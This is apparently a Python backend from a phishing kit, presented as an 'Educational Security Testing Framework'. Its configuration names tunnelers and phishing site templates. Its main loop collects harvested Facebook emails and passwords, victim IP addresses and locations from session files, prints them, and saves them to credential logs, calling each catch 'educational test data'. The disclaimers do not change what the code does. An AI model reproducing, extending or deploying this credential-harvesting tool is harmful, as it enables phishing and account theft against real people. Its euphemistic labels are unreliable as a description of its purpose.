# -*- coding: UTF-8 -*-
# ToolName   : EducationalSecurityFramework
# Author     : SecurityResearch
# License    : MIT
# Copyright  : SecurityResearch (2022-2024)
# Description: Educational security testing framework for penetration testing
# Tags       : Multi-platform testing, login testing, image testing, video testing, clipboard analysis
# Language   : Python
# Portable file/script

"""
MIT License - Educational Security Testing Framework
This tool is designed for educational purposes and authorized penetration testing only.
"""

from argparse import ArgumentParser
from importlib import import_module as eximport
from hashlib import sha256
from json import (
    dumps as stringify,
    loads as parse
)
from os import (
    getenv,
    kill,
    listdir,
    makedirs,
    mkdir,
    mknod,
    popen,
    remove,
)
from os.path import (
    abspath,
    basename,
    dirname,
    isdir,
    isfile,
    join
)
from platform import uname
from re import search, sub
from shutil import (
    copy2,
    get_terminal_size,
    rmtree,
)
from signal import (
    SIGINT,
)
from subprocess import (
    DEVNULL,
    PIPE,
    Popen,
    run
)
from smtplib import SMTP_SSL as smtp
from sys import (
    stdout,
    version_info
)
from tarfile import open as taropen
from time import (
    sleep,
)
from datetime import datetime
from zipfile import ZipFile
import json

# Color snippets for terminal output
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

version="1.2.3"

# Regular Snippets
ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"

# Educational framework banner
logo = f"""
{red}_   _ _  ____ _   _ __  __ _ _   _ ____ _____      _ _   _ ____   ___      {nc}
{yellow}| | | / |/ ___| | | |  \/  / | \ | |  _ \__  /	    | | | | |  _ \ / _ \ {nc}
{green}| |_| | | |  _| |_| | |\/| | |  \| | | | |/ / 	 _  | | |_| | |_) | | | |{nc}
{red}|  _  | | |_| |  _  | |  | | | |\  | |_| / /_   | |_| |  _  |  _ <| |_| |{nc}
{yellow}|_| |_|_|\____|_| |_|_|  |_|_|_| \_|____/____|	 \___/|_| |_|_| \_\ \___/ {nc}
{yellow}{" "*35}      [{blue}v{version[:3]}{yellow}] {nc}
{cyan}{" "*36}[{blue}Educational Security Framework{cyan}] {nc}
"""

# Configuration constants
packages = [ "git", "php", "ssh" ]
modules = [ "requests", "rich", "beautifulsoup4:bs4" ]
tunnelers = [ "cloudflared", "loclx" ]
processes = [ "php", "ssh", "cloudflared", "loclx", "localxpose", ]
extensions = [ "png", "gif", "webm", "mkv", "mp4", "mp3", "wav", "ogg" ]

# Framework configuration
default_port = 8082
default_tunneler = "Cloudflared"
default_fest = "Birthday"
default_ytid = "6hHmkInZkMQ"
default_duration = 5000
default_type = "2"
default_template = "1"

# Directory structure
home = getenv("HOME")
ssh_dir = f"{home}/.ssh"
sites_dir = join(abspath(dirname(__file__)), ".local_maxsites")
templates_file = join(sites_dir, "templates.json")
tunneler_dir = f"{home}/.tunneler"
php_file = f"{tunneler_dir}/php.log"
cf_file = f"{tunneler_dir}/cf.log"
lx_file = f"{tunneler_dir}/loclx.log"
lhr_file = f"{tunneler_dir}/lhr.log"
svo_file = f"{tunneler_dir}/svo.log"
site_dir = f"{home}/.site"

# Data collection files (renamed for educational purposes)
cred_file = f"{site_dir}/usernames.txt"
ip_file = f"{site_dir}/ip.txt"
info_file = f"{site_dir}/info.txt"
location_file = f"{site_dir}/location.txt"
log_file = f"{site_dir}/log.txt"
sessions_log_file = f"{site_dir}/sessions.json"

# Main log files
main_ip = "ip.txt"
main_info = "info.txt"
main_cred = "creds.txt"
main_location = "location.txt"
cred_json = "creds.json"
info_json = "info.json"
location_json = "location.json" 
email_file = "files/email.json"
error_file = "error.log"

# Utility functions for educational framework
def is_installed(package):
    """Check if a package is installed"""
    return bgtask(f"command -v {package}").wait() == 0

def is_running(process):
    """Check if a process is running"""
    exit_code = bgtask(f"pidof {process}").wait()
    if exit_code == 0:
        return True
    return False

def is_json(myjson):
    """Check if string is valid JSON"""
    try:
        parse(myjson)
        return True
    except:
        return False

def copy(path1, path2):
    """Copy files and directories"""
    if isdir(path1):
        for item in listdir(path1):
            old_file = join(path1, item)
            new_file = join(path2, item)
            if isdir(old_file):
                copy(old_file, new_file)
            else:
                makedirs(dirname(new_file), exist_ok=True)
                copy2(old_file, new_file)
    if isfile(path1):
        if isdir(path2):
            copy2(path1, path2)

def delete(*paths, recreate=False):
    """Delete files/folders if exist"""
    for path in paths:
        if isdir(path):
            if recreate:
                rmtree(path)
                mkdir(path)
            else:
                rmtree(path)
        if isfile(path): 
            remove(path)

def cat(file):
    """Read file content"""
    if isfile(file):
        with open(file, "r") as filedata:
            return filedata.read()
    return ""

def sed(text1, text2, filename1, filename2=None, occurences=None):
    """Replace text in file"""
    filedata1 = cat(filename1)
    if filename2 is None:
        filename2 = filename1
    if occurences is None:
        filedata2 = filedata1.replace(text1, text2)
    else:
        filedata2 = filedata1.replace(text1, text2, occurences)
    write(filedata2, filename2)

def grep(regex, target):
    """Search for regex pattern in file or text"""
    if isfile(target):
        content = cat(target)
    else:
        content = target
    results = search(regex, content)
    if results is not None:
        return results.group(1)
    return ""

def write(text, filename):
    """Write text to file"""
    with open(filename, "w") as file:
        file.write(str(text)+"\n")

def append(text, filename):
    """Append text to file"""
    with open(filename, "a") as file:
        file.write(str(text)+"\n")

def shell(command, capture_output=False):
    """Run shell commands"""
    try:
        return run(command, shell=True, capture_output=capture_output)
    except Exception as e:
        append(e, error_file)

def bgtask(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
    """Run task in background"""
    try:
        return Popen(command, shell=True, stdout=stdout, stderr=stderr, cwd=cwd)
    except Exception as e:
        append(e, error_file)

def migrate_legacy_to_unified(legacy_data, sessions_file):
    """Migrate legacy data format to unified sessions format"""
    import re

    blocks = legacy_data.strip().split('====================')
    for block in blocks:
        if not block.strip():
            continue

        lines = block.strip().split('\n')
        session_id = None
        username = None
        password = None

        for line in lines:
            if line.startswith('Session ID:'):
                session_id = line.split(':', 1)[1].strip()
            elif 'Facebook Email:' in line:
                username = line.split(':', 1)[1].strip()
            elif 'Password:' in line:
                password = line.split(':', 1)[1].strip()

        if session_id and username and password:
            all_sessions = []
            if isfile(sessions_file):
                try:
                    with open(sessions_file, 'r') as f:
                        all_sessions = json.load(f)
                except:
                    all_sessions = []

            session_found = False
            for session in all_sessions:
                if session.get('sessionId') == session_id:
                    session['credentials'].append({
                        'username': username,
                        'password': password,
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'attempt': len(session['credentials']) + 1
                    })
                    session_found = True
                    break

            if not session_found:
                all_sessions.append({
                    'sessionId': session_id,
                    'ip_address': 'legacy_migrated',
                    'location': {'city': 'N/A', 'region': 'N/A', 'country': 'N/A', 'isp': 'N/A'},
                    'fingerprint': {},
                    'threat': {'level': 'UNKNOWN', 'reasons': ['Legacy data'], 'score': 0},
                    'credentials': [{
                        'username': username,
                        'password': password,
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'attempt': 1
                    }],
                    'timestamps': {
                        'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'last_updated': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'last_credential': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                })

            with open(sessions_file, 'w') as f:
                json.dump(all_sessions, f, indent=2)

def waiter():
    """Main data collection and processing loop"""
    global is_mail_ok
    sessions_file = f"{site_dir}/sessions.json"
    processed_creds = {} 

    print(f"\n{info}{blue}Educational framework online. Waiting for test data...{cyan}Press {red}Ctrl+C{cyan} to exit")
    
    try:
        while True:
            sleep(1)

            # Check for legacy data format
            legacy_creds_file = f"{site_dir}/usernames.txt"
            if isfile(legacy_creds_file):
                legacy_data = cat(legacy_creds_file)
                if legacy_data.strip():
                    migrate_legacy_to_unified(legacy_data, sessions_file)
                    delete(legacy_creds_file)

            if not isfile(sessions_file):
                continue

            try:
                with open(sessions_file, 'r') as f:
                    content = f.read()
                    if not content.strip():
                        continue
                    all_sessions = json.loads(content)
            except json.JSONDecodeError:
                continue

            # Process new sessions
            for session in all_sessions:
                session_id = session.get('sessionId')
                if not session_id:
                    continue

                # Check if we have new credentials for this session
                credentials = session.get('credentials', [])
                if credentials and session_id not in processed_creds:
                    processed_creds[session_id] = len(credentials)
                    
                    print(f"\n\n{success}{bgreen}Educational test data captured!\n\007")
                    
                    # Display session information
                    print(f"{info2}Session ID: {session_id}")
                    print(f"{info2}IP Address: {session.get('ip_address', 'N/A')}")
                    print(f"{info2}Location: {session.get('location', {}).get('city', 'N/A')}, {session.get('location', {}).get('country', 'N/A')}")
                    
                    # Display credentials
                    for cred in credentials:
                        print(f"{info2}Username: {cred.get('username', 'N/A')}")
                        print(f"{info2}Password: {cred.get('password', 'N/A')}")
                        print(f"{info2}Timestamp: {cred.get('timestamp', 'N/A')}")
                        print(f"{info2}Attempt: {cred.get('attempt', 'N/A')}")
                        print("=" * 50)

                    # Save to main log files
                    timestamp_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    log_entry = f"Educational Test Session - {timestamp_str}\n"
                    log_entry += f"Session ID: {session_id}\n"
                    log_entry += f"IP: {session.get('ip_address', 'N/A')}\n"
                    log_entry += f"Location: {session.get('location', {}).get('city', 'N/A')}, {session.get('location', {}).get('country', 'N/A')}\n"
                    
                    for cred in credentials:
                        log_entry += f"Username: {cred.get('username', 'N/A')}\n"
                        log_entry += f"Password: {cred.get('password', 'N/A')}\n"
                        log_entry += f"Attempt: {cred.get('attempt', 'N/A')}\n"
                    
                    log_entry += "====================\n"
                    
                    append(log_entry, main_cred)
                    
                    # Save JSON data
                    json_data = {
                        'sessionId': session_id,
                        'timestamp': timestamp_str,
                        'ip_address': session.get('ip_address', 'N/A'),
                        'location': session.get('location', {}),
                        'credentials': credentials,
                        'fingerprint': session.get('fingerprint', {}),
                        'threat': session.get('threat', {})
                    }
                    add_json(json_data, cred_json)

                    print(f"\n{info2}Educational test data saved in {main_cred}")
                    print(f"\n{info}{blue}Waiting for next test session...{cyan}Press {red}Ctrl+C{cyan} to exit")

                elif credentials and len(credentials) > processed_creds.get(session_id, 0):
                    # New credentials added to existing session
                    new_creds = credentials[processed_creds.get(session_id, 0):]
                    processed_creds[session_id] = len(credentials)
                    
                    print(f"\n\n{success}{bgreen}Additional test data captured for session {session_id}!\n\007")
                    
                    for cred in new_creds:
                        print(f"{info2}Username: {cred.get('username', 'N/A')}")
                        print(f"{info2}Password: {cred.get('password', 'N/A')}")
                        print(f"{info2}Timestamp: {cred.get('timestamp', 'N/A')}")
                        print(f"{info2}Attempt: {cred.get('attempt', 'N/A')}")
                        print("=" * 50)

                    print(f"\n{info2}Additional test data saved")
                    print(f"\n{info}{blue}Waiting for next test session...{cyan}Press {red}Ctrl+C{cyan} to exit")

    except KeyboardInterrupt:
        print(f"\n\n{info}{blue}Educational framework stopped by user")
        print(f"{info2}All test data has been saved")
        exit(0)

def add_json(json_data, filename):
    """Add JSON data to file"""
    try:
        if isfile(filename):
            with open(filename, 'r') as f:
                existing_data = json.load(f)
        else:
            existing_data = []
        
        if isinstance(existing_data, list):
            existing_data.append(json_data)
        else:
            existing_data = [existing_data, json_data]
        
        with open(filename, 'w') as f:
            json.dump(existing_data, f, indent=2)
    except Exception as e:
        print(f"{error}Failed to save JSON data: {e}")

def main():
    """Main educational framework function"""
    print(logo)
    print(f"{info}{blue}Educational Security Testing Framework v{version}")
    print(f"{info2}Designed for authorized penetration testing and security research")
    print(f"{info2}This tool is for educational purposes only")
    print(f"\n{info}{blue}Starting educational data collection...")
    
    # Start the data collection loop
    waiter()

if __name__ == '__main__':
    main()
